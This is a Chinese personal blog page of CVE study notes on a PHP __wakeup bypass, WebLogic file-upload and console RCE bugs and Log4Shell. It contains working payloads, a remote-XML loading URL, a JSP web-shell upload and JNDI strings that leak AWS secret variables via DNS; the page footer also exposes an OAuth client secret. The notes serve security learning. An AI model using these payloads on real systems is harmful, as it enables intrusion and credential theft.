@@ -1,0 +1,709 @@
+<!DOCTYPE html>
+
+
+<html lang="zh-CN">
+  
+
+    <head>
+      <meta charset="utf-8" />
+        
+      <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1, maximum-scale=1"
+      />
+      <title>CVE学习 |  小张之栈</title>
+  <meta name="generator" content="hexo-theme-ayer">
+      
+      <link rel="shortcut icon" href="/favicon.ico" />
+       
+<link rel="stylesheet" href="/dist/main.css">
+
+      
+<link rel="stylesheet" href="/css/fonts/remixicon.css">
+
+      
+<link rel="stylesheet" href="/css/custom.css">
+ 
+      <script src="https://cdn.staticfile.org/pace/1.2.4/pace.min.js"></script>
+       
+ 
+
+      <link
+        rel="stylesheet"
+        href="https://cdn.jsdelivr.net/npm/@sweetalert2/theme-bulma@5.0.1/bulma.min.css"
+      />
+      <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.19/dist/sweetalert2.min.js"></script>
+
+      <!-- mermaid -->
+      
+      <style>
+        .swal2-styled.swal2-confirm {
+          font-size: 1.6rem;
+        }
+      </style>
+    </head>
+  </html>
+</html>
+
+
+<body>
+  <div id="app">
+    
+      <canvas class="fireworks"></canvas>
+      <style>
+        .fireworks {
+          position: fixed;
+          left: 0;
+          top: 0;
+          z-index: 99999;
+          pointer-events: none;
+        }
+      </style>
+      
+      
+    <main class="content on">
+      <section class="outer">
+  <article
+  id="post-CVE部分"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+  
+    
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  CVE学习
+</h1>
+ 
+
+      
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2023/05/20/CVE%E9%83%A8%E5%88%86/" class="article-date">
+  <time datetime="2023-05-20T00:11:37.000Z" itemprop="datePublished">2023-05-20</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/CVE/">CVE</a>
+  </div>
+  
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> 字数统计:</span>
+            <span class="post-count">1.7k</span>
+        </span>
+    </span>
+
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> 阅读时长≈</span>
+            <span class="post-count">8 分钟</span>
+        </span>
+    </span>
+</div>
+ 
+    </div>
+      
+    <div class="tocbot"></div>
+
+
+
+
+  
+    <div class="article-entry" itemprop="articleBody">
+       
+  <h1 id="CVE-2016-7124"><a href="#CVE-2016-7124" class="headerlink" title="CVE-2016-7124"></a>CVE-2016-7124</h1><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p>服务器：apache 2.4.39</p>
+<p>PHP版本：5.3.29nts</p>
+<h2 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h2><p>PHP5 &lt; 5.6.25</p>
+<p>PHP7 &lt; 7.0.10</p>
+<h2 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a>产生原因</h2><p>类中的wakeup()方法的绕过</p>
+<h2 id="代码复现"><a href="#代码复现" class="headerlink" title="代码复现"></a>代码复现</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Yuleiyun</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$target</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$b</span>=<span class="string">&quot;b&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	 <span class="variable language_">$this</span>-&gt;num=<span class="string">&quot;123&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">       <span class="variable language_">$this</span>-&gt;targer=<span class="string">&quot;10&quot;</span>;</span><br><span class="line">	   <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;num)||!<span class="variable language_">$this</span>-&gt;num)</span><br><span class="line">		   <span class="keyword">echo</span> <span class="string">&quot;you got it!&quot;</span>; </span><br><span class="line">	   <span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">&quot;haha&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>逻辑为：destruct中的num值未设置或者为空时，才会有输出。</p>
+<p>已知num这个值无法更改，所以尝试使num值未设置，则要绕过wakeup()。首先我们上传的参数要为序列化后的字符串：</p>
+<p>如：</p>
+<blockquote>
+<p>?test&#x3D;O:8:”Yuleiyun”:2:{s:6:”target”;N;s:1:”b”;s:1:”b”;}</p>
+<p>结果：</p>
+<p>object(Yuleiyun)#1 (3) { [“target”]&#x3D;&gt; NULL [“b”]&#x3D;&gt; string(1) “b” [“num”]&#x3D;&gt; string(3) “123” } haha</p>
+</blockquote>
+<p>由于wakeup函数存在且比反序列化先触发，故，只要使得反序列化过程中的结构不匹配，导致 PHP 在反序列化时无法正确还原对象的结构，进而无法触发wakeup()方法。</p>
+<p>如把成员数量由2改为3，不触发wakeup()，结果为</p>
+<blockquote>
+<p>?test&#x3D;O:8:”Yuleiyun”:3:{s:6:”target”;N;s:1:”b”;s:1:”b”;}</p>
+<p>结果：</p>
+<p>you got it!bool(false)</p>
+</blockquote>
+<h1 id="weblogic"><a href="#weblogic" class="headerlink" title="weblogic"></a>weblogic</h1><p>java中间件，端口为7001</p>
+<p>默认后台登录地址<a target="_blank" rel="noopener" href="http://ip:7001/console">http://ip:7001/console</a></p>
+<h2 id="CVE-2018-2894-任意文件上传漏洞"><a href="#CVE-2018-2894-任意文件上传漏洞" class="headerlink" title="CVE-2018-2894(任意文件上传漏洞)"></a>CVE-2018-2894(任意文件上传漏洞)</h2><h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><p>后台页面，点击<code>base_domain</code>的配置，在“高级”中开启“启用 Web 服务测试页”选项</p>
+<p>hrrp:&#x2F;&#x2F;ip:7001&#x2F;console&#x2F;login&#x2F;LoginForm.jsp</p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230722141302907.png"></p>
+<p>不用登陆，直接url访问:7001&#x2F;ws_utc&#x2F;config.do</p>
+<p>来到后台，设置路径，该路径可以无权限访问</p>
+<blockquote>
+<p>&#x2F;u01&#x2F;oracle&#x2F;user_projects&#x2F;domains&#x2F;base_domain&#x2F;servers&#x2F;AdminServer&#x2F;tmp&#x2F;_WL_internal&#x2F;com.oracle.webservices.wls.ws-testclient-app-wls&#x2F;4mcj4y&#x2F;war&#x2F;css</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230722141517874.png"></p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230722142032194.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Sat, 22 Jul 2023 06:38:32 GMT</span><br><span class="line">Content-Type: application/xml</span><br><span class="line">Connection: close</span><br><span class="line">Vary: Accept-Encoding</span><br><span class="line">Content-Length: 333</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;setting id=&quot;security&quot;&gt;&lt;section name=&quot;key_store_list&quot;&gt;&lt;options xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:type=&quot;securityOptions&quot;&gt;&lt;keyStoreItem&gt;&lt;id&gt;1690007912011&lt;/id&gt;&lt;name&gt;123&lt;/name&gt;&lt;keyStore&gt;shell.jsp&lt;/keyStore&gt;&lt;password&gt;123&lt;/password&gt;&lt;/keyStoreItem&gt;&lt;/options&gt;&lt;/section&gt;&lt;/setting&gt;</span><br></pre></td></tr></table></figure>
+
+<p>抓响应包，或者f12，发现有一个时间戳，可以构造路径</p>
+<p><a target="_blank" rel="noopener" href="http://you-ip/ws_utc/css/config/keystore/[%E6%97%B6%E9%97%B4%E6%88%B3]_[%E6%96%87%E4%BB%B6%E5%90%8D]">http://you-ip/ws_utc/css/config/keystore/[时间戳]_[文件名]</a></p>
+<p><a target="_blank" rel="noopener" href="http://eci-2ze5qymq43f2pcf4bh8r.cloudeci1.ichunqiu.com:7001/ws_utc/css/config/keystore/1690023268535_shell.jsp">http://eci-2ze5qymq43f2pcf4bh8r.cloudeci1.ichunqiu.com:7001/ws_utc/css/config/keystore/1690023268535_shell.jsp</a></p>
+<p>然后嘞，网页访问下这个路径，执行.jsp</p>
+<p>蚁剑连接</p>
+<p>哦豁，没连上</p>
+<p>下载冰蝎，生成一个jsp木马，默认密码rebeyond</p>
+<p>状态明明是绿色，点进去失败，也没用，算了</p>
+<p>我生气啦。</p>
+<p>说是还有&#x2F;ws_utc&#x2F;begin.do</p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230722190514604.png" alt="image-20230722190514604"></p>
+<p>上报出错，查看回显日志，但是是传进去了</p>
+<p>看响应包</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">encoding=&quot;UTF-8&quot;?&gt;&lt;errorMsgBean&gt;&lt;title&gt;Web服务测试运行期错误&lt;/title&gt;&lt;desc&gt;导入测试错误&lt;/desc&gt;&lt;details&gt;com.oracle.webservices.testclient.exception.WSTestRuntimeException: javax.xml.bind.UnmarshalException</span><br><span class="line"> - with linked exception:</span><br><span class="line">[Exception [EclipseLink-25004] (Eclipse Persistence Services - 2.5.2.v20140319-9ad6abd): org.eclipse.persistence.exceptions.XMLMarshalException</span><br><span class="line">Exception Description: An error occurred unmarshalling the document</span><br><span class="line">Internal Exception: org.xml.sax.SAXParseException; systemId: file:/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css/upload/RS_Upload_2023-07-22_11-06-26_875/import_file_name_shell.jsp; lineNumber: 1; columnNumber: 2; The markup in the document preceding the root element must be well-formed.]</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file:/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css/upload/RS_Upload_2023-07-22_11-06-26_875/import_file_name_shell.jsp   //给了路径</span><br></pre></td></tr></table></figure>
+
+<h2 id="CVE-2020-14882"><a href="#CVE-2020-14882" class="headerlink" title="CVE-2020-14882"></a>CVE-2020-14882</h2><p>允许未授权的用户绕过管理控制台的权限验证访问后台</p>
+<h2 id="CVE-2020-14883"><a href="#CVE-2020-14883" class="headerlink" title="CVE-2020-14883"></a>CVE-2020-14883</h2><p>允许后台任意用户通过HTTP协议执行任意命令</p>
+<h2 id="Weblogic-管理控制台未授权远程命令执行漏洞"><a href="#Weblogic-管理控制台未授权远程命令执行漏洞" class="headerlink" title="(Weblogic 管理控制台未授权远程命令执行漏洞)"></a>(Weblogic 管理控制台未授权远程命令执行漏洞)</h2><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>首先是cve-2020-14882</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://your-ip:7001/console/css/%252e%252e%252fconsole.portal</span><br></pre></td></tr></table></figure>
+
+<p>可以通过未授权访问到管理页面</p>
+<p>安装应用等功能时，会有消息提示，权限不足</p>
+<p>cve-2020-14883的利用方式有二种：</p>
+<p>1是：<code>com.tangosol.coherence.mvel2.sh.ShellSession</code>Weblogic 12.2.1以上版本利用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://your-ip:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&amp;_pageLabel=&amp;handle=com.tangosol.coherence.mvel2.sh.ShellSession(&quot;java.lang.Runtime.getRuntime().exec(&#x27;touch%20/tmp/success1&#x27;);&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>2是：<code>com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext</code>对于所有Weblogic版本均有效</p>
+<p>构造XML文件，保存到在Weblogic可以访问到的服务器上</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span><br><span class="line">&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;</span><br><span class="line">   xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">   xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt;</span><br><span class="line">    &lt;bean id=&quot;pb&quot; class=&quot;java.lang.ProcessBuilder&quot; init-method=&quot;start&quot;&gt;</span><br><span class="line">        &lt;constructor-arg&gt;</span><br><span class="line">          &lt;list&gt;</span><br><span class="line">            &lt;value&gt;bash&lt;/value&gt;</span><br><span class="line">            &lt;value&gt;-c&lt;/value&gt;</span><br><span class="line">            &lt;value&gt;&lt;![CDATA[touch /tmp/success2]]&gt;&lt;/value&gt;</span><br><span class="line">          &lt;/list&gt;</span><br><span class="line">        &lt;/constructor-arg&gt;</span><br><span class="line">    &lt;/bean&gt;</span><br><span class="line">&lt;/beans&gt;</span><br></pre></td></tr></table></figure>
+
+<p>访问以下url，让weblogic加载该xml，执行其中命令(需要Weblogic的服务器能够访问到恶意XML)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://your-ip:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&amp;_pageLabel=&amp;handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext(&quot;http://example.com/rce.xml&quot;)</span><br></pre></td></tr></table></figure>
+
+<h1 id="CVE-2021–44228-Log4Shell"><a href="#CVE-2021–44228-Log4Shell" class="headerlink" title="CVE-2021–44228 (Log4Shell)"></a>CVE-2021–44228 (Log4Shell)</h1><h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><p>如果记录用户控制的字符串，Java 日志库 log4j 存在未经身份验证的 RCE 漏洞</p>
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Apache log4j 2.0-beta9 ≤ 2.14.1</p>
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="位置"><a href="#位置" class="headerlink" title="位置"></a>位置</h3><p>将构造的有效负载注入头部、输入字段或查询&#x2F;正文参数中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">Authorization</span><br><span class="line">Cache-Control</span><br><span class="line">Cf-Connecting_ip</span><br><span class="line">Client-Ip</span><br><span class="line">Contact</span><br><span class="line">Cookie</span><br><span class="line">Forwarded-For-Ip</span><br><span class="line">Forwarded-For</span><br><span class="line">Forwarded</span><br><span class="line">If-Modified-Since</span><br><span class="line">Originating-Ip</span><br><span class="line">Referer</span><br><span class="line">True-Client-Ip</span><br><span class="line">User-Agent</span><br><span class="line">X-Api-Version</span><br><span class="line">X-Client-Ip</span><br><span class="line">X-Forwarded-For</span><br><span class="line">X-Leakix</span><br><span class="line">X-Originating-Ip</span><br><span class="line">X-Real-Ip</span><br><span class="line">X-Remote-Addr</span><br><span class="line">X-Remote-Ip</span><br><span class="line">X-Wap-Profile</span><br><span class="line">Authorization: Basic</span><br><span class="line">Authorization: Bearer</span><br><span class="line">Authorization: Oauth</span><br><span class="line">Authorization: Token</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="可注入的信息"><a href="#可注入的信息" class="headerlink" title="可注入的信息"></a>可注入的信息</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">$&#123;hostName&#125;</span><br><span class="line">$&#123;sys:user.name&#125;</span><br><span class="line">$&#123;sys:user.home&#125;</span><br><span class="line">$&#123;sys:user.dir&#125;</span><br><span class="line">$&#123;sys:java.home&#125;</span><br><span class="line">$&#123;sys:java.vendor&#125;</span><br><span class="line">$&#123;sys:java.version&#125;</span><br><span class="line">$&#123;sys:java.vendor.url&#125;</span><br><span class="line">$&#123;sys:java.vm.version&#125;</span><br><span class="line">$&#123;sys:java.vm.vendor&#125;</span><br><span class="line">$&#123;sys:java.vm.name&#125;</span><br><span class="line">$&#123;sys:os.name&#125;</span><br><span class="line">$&#123;sys:os.arch&#125;</span><br><span class="line">$&#123;sys:os.version&#125;</span><br><span class="line">$&#123;env:JAVA_VERSION&#125;</span><br><span class="line">$&#123;env:AWS_SECRET_ACCESS_KEY&#125;</span><br><span class="line">$&#123;env:AWS_SESSION_TOKEN&#125;</span><br><span class="line">$&#123;env:AWS_SHARED_CREDENTIALS_FILE&#125;</span><br><span class="line">$&#123;env:AWS_WEB_IDENTITY_TOKEN_FILE&#125;</span><br><span class="line">$&#123;env:AWS_PROFILE&#125;</span><br><span class="line">$&#123;env:AWS_CONFIG_FILE&#125;</span><br><span class="line">$&#123;env:AWS_ACCESS_KEY_ID&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="服务与扫描"><a href="#服务与扫描" class="headerlink" title="服务与扫描"></a>服务与扫描</h3><p>dnslog.cn呢是证明有该 <strong>服务</strong></p>
+<p><strong>扫描</strong>，可以用专门的log4j漏洞扫描器，去检测目标网址</p>
+<h3 id="有效负载"><a href="#有效负载" class="headerlink" title="有效负载"></a>有效负载</h3><p>构造如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://target.com/?test=$&#123;jndi:ldap://jv-$&#123;sys:java.version&#125;-hn-$&#123;hostName&#125;.qwe3er.dnslog.cn/exp&#125;</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li>使用<strong>dnslog.cn</strong>(一个网址，可以sql注入盲注时带外查询)去创建自己的子域名进行测试，比如：<code>qwe3er.dnslog.cn</code></li>
+<li>使用<strong>此子域</strong>来制作<strong>有效负载</strong>(上述负载)并将其与请求一起发送。一段时间后检查对 DNS 服务的请求以确认回调成功</li>
+<li>应该会收到类似的 DNS 服务请求（包含主机和 Java 版本）</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jv-11.0.13-hn-73a957d15746.qwe3er.dnslog.cn</span><br></pre></td></tr></table></figure>
+
+
+
+ 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <div class="declare">
+      <ul class="post-copyright">
+        <li>
+          <i class="ri-copyright-line"></i>
+          <strong>版权声明： </strong>
+          
+          本博客所有文章除特别声明外，著作权归作者所有。转载请注明出处！
+          
+        </li>
+      </ul>
+    </div>
+    
+    <footer class="article-footer">
+       
+<div class="share-btn">
+      <span class="share-sns share-outer">
+        <i class="ri-share-forward-line"></i>
+        分享
+      </span>
+      <div class="share-wrap">
+        <i class="arrow"></i>
+        <div class="share-icons">
+          
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="ri-weibo-fill"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="ri-wechat-fill"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="ri-qq-fill"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="ri-douban-line"></i>
+          </a>
+          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a> -->
+          
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="ri-facebook-circle-fill"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="ri-twitter-fill"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="ri-google-fill"></i>
+          </a>
+        </div>
+      </div>
+</div>
+
+<div class="wx-share-modal">
+    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2023/05/20/CVE%E9%83%A8%E5%88%86/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div id="share-mask"></div>  
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/log4j/" rel="tag">log4j</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/weblogic/" rel="tag">weblogic</a></li></ul>
+
+    </footer>
+  </div>
+
+   
+  <nav class="article-nav">
+    
+      <a href="/2023/05/20/Web%E6%BA%90%E7%A0%81%E6%8B%93%E5%B1%95/" class="article-nav-link">
+        <strong class="article-nav-caption">上一篇</strong>
+        <div class="article-nav-title">
+          
+            Web源码拓展
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2023/05/20/sqlmap%E4%BD%BF%E7%94%A8/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">sqlmap使用</div>
+      </a>
+    
+  </nav>
+
+  
+   
+<div class="gitalk" id="gitalk-container"></div>
+
+<link rel="stylesheet" href="https://cdn.staticfile.org/gitalk/1.7.2/gitalk.min.css">
+
+
+<script src="https://cdn.staticfile.org/gitalk/1.7.2/gitalk.min.js"></script>
+
+
+<script src="https://cdn.staticfile.org/blueimp-md5/2.19.0/js/md5.min.js"></script>
+
+<script type="text/javascript">
+  var gitalk = new Gitalk({
+    clientID: '93da8388ad1469a8be66',
+    clientSecret: '9dea6314b14ae1877632f2bcbe0a639dd4485bb1',
+    repo: 'blogtalk',
+    owner: 'ak005469075',
+    admin: ['ak005469075'],
+    // id: location.pathname,      // Ensure uniqueness and length less than 50
+    id: md5(location.pathname),
+    distractionFreeMode: false,  // Facebook-like distraction free mode
+    pagerDirection: 'last'
+  })
+
+  gitalk.render('gitalk-container')
+</script>
+
+  
+    
+</article>
+
+</section>
+      <footer class="footer">
+  <div class="outer">
+    <ul>
+      <li>
+        Copyrights &copy;
+        2023-2024
+        <i class="ri-heart-fill heart_icon"></i> 是羽泪云诶
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+        
+        <span>
+  <span><i class="ri-user-3-fill"></i>访问人数:<span id="busuanzi_value_site_uv"></span></span>
+  <span class="division">|</span>
+  <span><i class="ri-eye-fill"></i>浏览次数:<span id="busuanzi_value_page_pv"></span></span>
+</span>
+        
+      </li>
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      <li>
+        <!-- cnzz统计 -->
+        
+        <script type="text/javascript" src='https://s9.cnzz.com/z_stat.php?id=1278069914&amp;web_id=1278069914'></script>
+        
+      </li>
+    </ul>
+  </div>
+</footer>    
+    </main>
+    <div class="float_btns">
+      <div class="totop" id="totop">
+  <i class="ri-arrow-up-line"></i>
+</div>
+
+<div class="todark" id="todark">
+  <i class="ri-moon-line"></i>
+</div>
+
+    </div>
+    <aside class="sidebar on">
+      <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+  <div class="logo">
+    <a href="/"><img src="/favicon.ico" alt="小张之栈"></a>
+  </div>
+  
+  <ul class="nav nav-main">
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/">主页</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/archives">归档</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/categories">分类</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/tags">标签</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/about">关于我</a>
+    </li>
+    
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      
+      <a class="nav-item-link nav-item-search"  title="搜索">
+        <i class="ri-search-line"></i>
+      </a>
+      
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+  <script type="text/javascript">
+$(function () {
+    console.log("lets go！");
+    console.log("/");
+    searchFunc("/" + "search.xml", 'searchInput', 'searchResult');
+});
+</script>
+</div>
+
+</div>
+    </aside>
+    <div id="mask"></div>
+
+<!-- #reward -->
+<div id="reward">
+  <span class="close"><i class="ri-close-line"></i></span>
+  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
+  <div class="reward-box">
+    
+    <div class="reward-item">
+      <img class="reward-img" src="/images/alipay.jpg">
+      <span class="reward-type">支付宝</span>
+    </div>
+    
+    
+    <div class="reward-item">
+      <img class="reward-img" src="/images/wechat.jpg">
+      <span class="reward-type">微信</span>
+    </div>
+    
+  </div>
+</div>
+    
+<script src="/js/jquery-3.6.0.min.js"></script>
+ 
+<script src="/js/lazyload.min.js"></script>
+
+<!-- Tocbot -->
+ 
+<script src="/js/tocbot.min.js"></script>
+
+<script>
+  tocbot.init({
+    tocSelector: ".tocbot",
+    contentSelector: ".article-entry",
+    headingSelector: "h1, h2, h3, h4, h5, h6",
+    hasInnerContainers: true,
+    scrollSmooth: true,
+    scrollContainer: "main",
+    positionFixedSelector: ".tocbot",
+    positionFixedClass: "is-position-fixed",
+    fixedSidebarOffset: "auto",
+  });
+</script>
+
+<script src="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.js"></script>
+<link
+  rel="stylesheet"
+  href="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.css"
+/>
+<script src="https://cdn.staticfile.org/justifiedGallery/3.8.1/js/jquery.justifiedGallery.min.js"></script>
+
+<script src="/dist/main.js"></script>
+
+<!-- ImageViewer -->
+ <!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
